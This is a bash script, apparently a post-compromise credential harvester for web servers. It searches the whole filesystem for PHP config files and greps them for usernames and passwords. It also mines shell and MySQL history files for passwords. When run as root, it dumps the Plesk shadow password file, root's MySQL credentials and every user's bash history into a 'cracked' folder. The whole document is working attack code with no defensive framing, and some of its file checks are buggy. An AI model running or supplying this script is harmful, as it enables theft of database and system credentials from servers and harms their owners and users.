#!/bin/bash

#cleaning some logs
rm -rf cracked/*
mkdir cracked
cd cracked
echo "******************************************"
echo "******************************************"

echo "# Starting search for PHP Mysql config files ... [OK]"
find / -name "*conf*.php" >> log.config 2> /dev/null
echo "# Filtering and dumping information ... [OK]"

for i in `cat log.config`
do
        echo "*******************************************" >> php.txt
        echo "# Finding passwords in $i ..." >> php.txt
        cat $i|grep user >> php.txt;cat $i|grep pass >> php.txt
done

rm -f log.config

echo "* We got `wc -l php.txt|awk '{print $1}'` lines of code in cracked/php.txt"

if [ "`whoami`" != "nobody" ];then
        echo "********************************************"
        echo "# Starting search in our history files ... [OK]"
        cat ~/.bash_history|grep mysql >> local.txt
        cat ~/.bash_history|grep pass >> local.txt
        cat ~/.mysql_history|grep "\-p" >> local.txt
        if [ ! -f local.txt ];then

                echo "# No passwords found ... [FAILED]"
        else
                echo "# We got `wc -l local.txt|awk '{print $1}'` lines of code in logs/local.txt"
        fi

fi

if [ `whoami` == root ];then
        echo "************************************************"
        echo "# Starting root privilege password scan ... [OK]"
        if [ -f /etc/psa/.psa.shadow ];then
        echo ".PSA.SHADOW: `cat /etc/psa/.psa.shadow`" >> root.txt
fi
if [ -f /root/.my.cnf ];then
        echo ".MY.CNF : `cat /root/.my.cnf`" >> root.txt
fi

        if [ -f root_info ];then
                echo  "# We got `wc -l root_info|awk '{print $1}'` lines of code in root.txt"
        fi


        echo "# Searching for history in home files ... [OK]"

        for i in `ls /home`
        do
                echo "*******************************************" >> home.txt
                echo "# [$i] from /home/$i : " >> home.txt
                cat /home/$i/.bash_history|grep pass >> home.txt &> /dev/null
                cat /home/$i/.bash_history|grep mysql >> home.txt &> /dev/null
        done
        echo "# We got `wc -l local.txt|awk '{print $1}'` lines of code in logs/home.txt"
fi
echo "*********************************************"
